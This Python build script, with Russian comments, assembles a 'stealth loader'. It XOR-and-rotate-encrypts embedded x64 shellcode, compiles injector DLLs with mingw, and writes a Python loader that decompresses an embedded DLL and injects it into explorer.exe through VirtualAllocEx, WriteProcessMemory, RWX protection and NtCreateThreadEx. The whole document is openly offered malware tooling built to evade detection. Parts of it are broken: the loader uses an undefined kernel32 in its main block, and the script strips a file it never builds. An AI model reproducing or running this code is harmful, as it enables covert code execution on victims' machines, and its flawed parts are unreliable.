import os
import subprocess
import zlib
import sys

# ====================== НАСТРОЙКИ ======================
XOR_KEY = 0x9F
ROT_VALUE = 5
TARGET_PROCESS = "explorer.exe"   # можно менять

DLL_NAME = "stealth_injector.dll"
FINAL_LOADER = "stealth_loader.py"
# =====================================================

def run_command(cmd):
    print(f"[+] Running: {cmd}")
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if result.returncode != 0:
        print(f"[-] Error: {result.stderr}")
        return False
    return True

print("================================================")
print("     Full Stealth Loader Builder")
print("================================================")

# 1. Шифрование shellcode
print("[+] Encrypting shellcode...")
with open("encrypt_shellcode.py", "w", encoding="utf-8") as f:
    f.write(f'''import sys
xor_key = {XOR_KEY}
rot = {ROT_VALUE}

shellcode = (
    b"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51"
    b"\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52"
    b"\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0"
    b"\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed"
    b"\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88"
    b"\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44"
    b"\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48"
    b"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1"
    b"\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44"
    b"\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49"
    b"\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a"
    b"\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41"
    b"\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00"
    b"\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b"
    b"\\x6f\\x87\\xff\\xd5\\xbb\\xe0\\x1d\\x2a\\x0a\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff"
    b"\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47"
    b"\\x13\\x72\\x6f\\x48\\xb8\\xeb\\x1a\\x02\\x7b\\x21\\x4b\\x47\\x11\\x48\\xbb\\x88"
    b"\\x77\\x66\\x55\\x44\\x33\\x22\\x11\\x48\\x31\\xd8\\x50\\x59\\x41\\x89\\xda\\xff"
    b"\\xd5"
)

encrypted = bytearray()
for b in shellcode:
    b ^= xor_key
    b = ((b << rot) & 0xFF) | (b >> (8 - rot))
    encrypted.append(b)

print(f"// Encrypted with XOR=0x{xor_key:02X}, ROT={rot}")
print("unsigned char encrypted_payload[] = {")
print(", ".join(f"0x{b:02x}" for b in encrypted))
print("};")
print(f"unsigned int payload_len = {len(encrypted)};")
''')

run_command("python encrypt_shellcode.py > encrypted_payload.h")

# 2. Сборка
print("[+] Building helper.dll and stealth_injector.dll...")
run_command('x86_64-w64-mingw32-gcc -shared -o helper.dll helper.c -Wl,--subsystem,windows -s -O2')

run_command('python bin2c.py helper.dll > helper_data.h')

run_command('x86_64-w64-mingw32-gcc -shared -o stealth_injector.dll stealth_injector.c -Wl,--subsystem,windows -s -O2 -fno-stack-protector')
# run_command('x86_64-w64-mingw32-gcc -shared -o stealth_injector.dll stealth_injector.c -Wl,--subsystem,windows -s -O2')
run_command('strip injector.dll')

# 3. Встраивание в Python
print("[+] Embedding DLL into stealth_loader.py...")

with open("stealth_injector.dll", "rb") as f:
    dll_data = f.read()

compressed = zlib.compress(dll_data, level=9)

with open(FINAL_LOADER, "w", encoding="utf-8") as f:
    f.write('''import ctypes
import sys
import struct
import zlib

if sys.platform != "win32":
    print("[-] This script works only on Windows")
    sys.exit(1)

# ====================== EMBEDDED COMPRESSED DLL ======================
COMPRESSED_DLL = b''' + repr(compressed)[2:-1] + '''

def get_dll_bytes():
    return zlib.decompress(COMPRESSED_DLL)

''')

    # Добавляем остальной код loader
    f.write('''# ====================== REFLECTIVE INJECTOR ======================
class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong), ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong), ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong), ("szExeFile", ctypes.c_char * 260),
    ]

def reflective_inject(pid: int, dll_bytes: bytes):
    kernel32 = ctypes.windll.kernel32
    ntdll = ctypes.windll.ntdll

    h_process = kernel32.OpenProcess(0x1F0FFF, False, pid)
    if not h_process:
        raise ctypes.WinError()

    try:
        dll_size = len(dll_bytes)
        remote_base = kernel32.VirtualAllocEx(h_process, None, dll_size, 0x3000, 0x04)
        if not remote_base:
            raise ctypes.WinError()

        written = ctypes.c_size_t(0)
        kernel32.WriteProcessMemory(h_process, remote_base, dll_bytes, dll_size, ctypes.byref(written))

        # Parse EntryPoint
        e_lfanew = struct.unpack_from("<I", dll_bytes, 0x3C)[0]
        entry_rva = struct.unpack_from("<I", dll_bytes, e_lfanew + 0x28)[0]
        entry_point = remote_base + entry_rva

        old = ctypes.c_ulong(0)
        kernel32.VirtualProtectEx(h_process, remote_base, dll_size, 0x40, ctypes.byref(old))

        h_thread = ctypes.c_void_p(0)
        status = ntdll.NtCreateThreadEx(ctypes.byref(h_thread), 0x1FFFFF, None, h_process, entry_point, remote_base, 0, 0, 0, 0, None)

        if status == 0:
            print(f"[+] Successfully injected into PID {pid}")
            kernel32.WaitForSingleObject(h_thread, 15000)
        else:
            print("[-] NtCreateThreadEx failed, using fallback...")
            kernel32.CreateRemoteThread(h_process, None, 0, entry_point, remote_base, 0, None)
    finally:
        kernel32.CloseHandle(h_process)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python stealth_loader.py <target>")
        print("Example: python stealth_loader.py explorer.exe")
        sys.exit(1)

    target = sys.argv[1]
    try:
        dll_bytes = get_dll_bytes()
        print(f"[+] Loaded embedded DLL: {len(dll_bytes):,} bytes")

        snapshot = kernel32.CreateToolhelp32Snapshot(0x00000002, 0)
        pe = PROCESSENTRY32()
        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)

        if kernel32.Process32First(snapshot, ctypes.byref(pe)):
            while True:
                if pe.szExeFile.decode('utf-8', errors='ignore').lower() == target.lower():
                    print(f"[+] Injecting into {target} (PID: {pe.th32ProcessID})")
                    reflective_inject(pe.th32ProcessID, dll_bytes)
                    break
                if not kernel32.Process32Next(snapshot, ctypes.byref(pe)):
                    break
    except Exception as e:
        print(f"[-] Error: {e}")
''')

print(f"\\n[+] Build completed successfully!")
print(f"[+] Ready file: **{FINAL_LOADER}**")
print(f"[+] Usage: python {FINAL_LOADER} explorer.exe")